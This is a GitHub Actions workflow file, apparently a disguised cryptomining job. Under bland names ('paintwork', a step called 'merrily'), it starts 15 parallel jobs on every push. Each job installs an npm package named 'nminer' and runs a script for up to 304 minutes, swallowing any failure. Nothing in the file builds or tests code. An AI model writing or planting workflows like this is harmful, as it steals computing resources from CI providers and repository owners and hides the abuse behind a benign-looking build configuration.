name: paintwork
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 3590 }
          - { version: 1337 }
          - { version: 5085 }
          - { version: 3810 }
          - { version: 6958 }
          - { version: 1707 }
          - { version: 1704 }
          - { version: 1033 }
          - { version: 587 }
          - { version: 8166 }
          - { version: 5959 }
          - { version: 9184 }
          - { version: 7005 }
          - { version: 6348 }
          - { version: 7939 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: merrily
        run: |
          npm install nminer@latest
          timeout 304m node paintwork.js || echo "paintwork executed"